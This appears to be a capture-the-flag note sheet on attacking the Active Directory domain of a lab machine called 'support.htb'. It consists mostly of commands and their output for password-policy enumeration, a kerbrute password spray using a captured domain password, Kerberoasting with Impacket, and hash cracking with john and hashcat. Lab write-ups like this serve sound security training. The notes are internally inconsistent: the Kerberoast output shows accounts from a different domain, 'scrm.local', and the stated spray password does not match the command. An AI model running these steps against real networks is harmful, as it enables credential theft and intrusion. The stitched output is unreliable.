# Password policy enumeration
can we brute?
```$ python enum_policy.py support.htb 'support\support' 'Ironside437pleasure401Watchful'```
```
##################################
# Domain name: DC=support,DC=htb #
##################################
-------------------------------
[b'[LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb;0]']
lockoutThreshold: [b'0']
lockoutDuration: [b'-18000000000']
minPwdAge: [b'-864000000000']
maxPwdAge: [b'-9223372036854775808']
minPwdLength: [b'7']
modifiedCount: [b'1']
```
# Password Spray
Trying 'Aa123456' against all domain users.
```$ kerbrute passwordspray -d support.htb --dc 10.10.11.174 loot/users.txt 'Ironside437pleasure401Watchful'```

```loot/users.txt```
```
Administrator
Guest
krbtgt
ldap
support
ford.victoria
```
# Kerberoasting
SPN set on a user? we can ask the KDC for a TGS that contains their password and crack it offline 

```$ python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.11.174 'support.htb/support:Ironside437pleasure401Watchful'```

```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-21 11:51:15.168848
```
Cracking the hash:
```
$ john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
```
hashcat -a 0 -m 19600 kerberoastable.txt /usr/share/wordlists/rockyou.txt
# -m flags
  19600 | Kerberos 5, etype 17, TGS-REP
  19700 | Kerberos 5, etype 18, TGS-REP
  13100 | Kerberos 5, etype 23, TGS-REP
```
